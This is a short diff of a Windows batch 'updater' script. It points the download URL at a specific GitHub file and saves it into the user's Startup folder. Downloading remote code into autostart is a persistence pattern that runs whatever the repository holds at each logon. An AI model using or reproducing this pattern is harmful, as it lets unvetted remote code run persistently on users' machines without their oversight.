@@ -2,11 +2,11 @@
 setlocal
 
 :: Define the URL of the script to update from
-set "SCRIPT_URL=https://raw.githubusercontent.com/username/repository/branch/script.bat"
+set "SCRIPT_URL=https://raw.githubusercontent.com/wicorn29/batch/main/up.bat"
 
 :: Define the destination path in the startup folder
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "DESTINATION_PATH=%STARTUP_FOLDER%\script.bat"
+set "DESTINATION_PATH=%STARTUP_FOLDER%\up.bat"
 
 :: Update the script by downloading the latest version from GitHub
 echo Updating script from %SCRIPT_URL%...
